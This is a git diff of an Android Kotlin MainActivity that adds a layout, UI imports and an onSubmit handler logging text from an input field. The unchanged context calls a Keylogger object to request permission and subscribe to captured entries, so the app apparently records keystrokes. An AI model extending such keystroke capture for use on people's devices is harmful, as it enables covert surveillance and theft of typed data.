@@ -8,6 +8,9 @@ import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
+import android.view.View
+import android.widget.Button
+import android.widget.EditText
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
 import androidx.lifecycle.lifecycleScope
@@ -17,10 +20,20 @@ import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
 
         Keylogger.requestPermission(this)
         createNotificationChannel();
+
+        /*val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
+        val monitorButton = findViewById<Button>(R.id.monitorButton);
+
+        monitorButton.setOnClickListener {
+            Log.e("botão", "clicou");
+            val content = codeInputFieldText.text.toString();
+            Log.e("Content retrieved", content);
+        }*/
 
         lifecycleScope.launch {
             Keylogger.subscribe { entry ->
@@ -62,5 +75,13 @@ class MainActivity : AppCompatActivity() {
                 getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.createNotificationChannel(channel)
         }
+    }
+
+    fun onSubmit(view: View){
+        val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
+
+        Log.e("botão", "clicou");
+        val content = codeInputFieldText.text.toString();
+        Log.e("Content retrieved", content);
     }
 }
